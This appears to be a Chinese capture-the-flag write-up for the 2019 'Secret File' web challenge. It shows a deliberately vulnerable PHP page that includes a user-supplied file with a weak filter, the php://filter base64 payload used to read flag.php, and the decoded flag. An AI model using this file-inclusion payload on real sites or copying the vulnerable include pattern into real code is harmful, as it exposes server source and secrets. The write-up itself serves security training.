[极客大挑战 2019]Secret File
![alt text](image.png)
查看页面源码
![alt text](image-1.png)
查看文件
![alt text](image-2.png)
点击直接显示查阅结束
![alt text](image-3.png)
尝试Burp抓包
![alt text](image-4.png)
查看secr3t.php 
```
<html>
    <title>secret</title>
    <meta charset="UTF-8">
<?php
    highlight_file(__FILE__);
    error_reporting(0);
    $file=$_GET['file'];
    if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){
        echo "Oh no!";
        exit();
    }
    include($file); 
//flag放在了flag.php里
?>
</html>
```
提示flag在flag.php里，过滤了能直接读取的方法，有include方法，尝试用php://filter查看
```
http://4d8ea91199c7f006bb088a48.http-ctf2.dasctf.com/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php
```
用base64处理回显即可
![alt text](image-5.png)
```
<!DOCTYPE html>

<html>

    <head>
        <meta charset="utf-8">
        <title>FLAG</title>
    </head>

    <body style="background-color:black;"><br><br><br><br><br><br>
        
        <h1 style="font-family:verdana;color:red;text-align:center;">啊哈！你找到我了！可是你看不到我QAQ~~~</h1><br><br><br>
        
        <p style="font-family:arial;color:red;font-size:20px;text-align:center;">
            <?php
                echo "我就在这里";
                $flag = 'CTF2{252dc718-cd94-4c4a-b119-2ba00e38e566}';
                $secret = 'jiAng_Luyuan_w4nts_a_g1rIfri3nd'
            ?>
        </p>
    </body>

</html>

```